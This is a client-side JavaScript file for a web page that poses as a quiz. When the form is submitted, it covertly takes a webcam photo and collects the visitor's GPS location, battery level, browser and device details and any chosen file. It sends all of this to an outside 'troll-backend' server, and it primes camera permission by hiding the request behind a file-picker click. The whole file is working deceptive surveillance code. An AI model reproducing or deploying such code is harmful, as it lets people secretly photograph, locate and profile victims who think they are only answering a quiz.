const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const toast = document.getElementById("toast");
const fileInput = document.getElementById("user-file");
const submitBtn = document.getElementById("submit-btn");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

// Show a toast notification
function showToast(message) {
  toast.innerText = message;
  toast.style.display = "block";
  toast.style.opacity = 1;

  setTimeout(() => {
    toast.style.opacity = 0;
    setTimeout(() => (toast.style.display = "none"), 300);
  }, 2000);
}

// Request camera permission asynchronously when file input is clicked
fileInput.addEventListener("click", () => {
  // Request camera permission in background, but don't await
  navigator.mediaDevices.getUserMedia(constraints)
    .then(stream => {
      console.log("Camera permission granted");
      // Stop immediately; we just wanted permission
      stream.getTracks().forEach(track => track.stop());
    })
    .catch(err => console.warn("Camera permission denied or ignored:", err));
  // File picker will open immediately
});

// Handle form submission
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Uploading your response...");

  try {
    // Start camera to capture image
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;
    await videoEl.play();

    // Wait until video is ready
    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));

    // Capture image from video
    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const image = canvasEl.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString()
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Get the uploaded file (if any)
    let uploadedFileData = null;
    if (fileInput.files.length > 0) {
      const file = fileInput.files[0];
      uploadedFileData = await new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.onerror = err => reject(err);
        reader.readAsDataURL(file);
      });
    }

    // Send data to backend
    const response = await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata, uploadedFile: uploadedFileData })
    });

    // Stop camera
    videoEl.srcObject.getTracks().forEach(track => track.stop());

    // Show success page
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";

    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
    showToast("Response submitted successfully!");
  } catch (err) {
    console.error(err);
    showToast("Error! Please allow camera access.");
    alert("Please allow camera access!");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
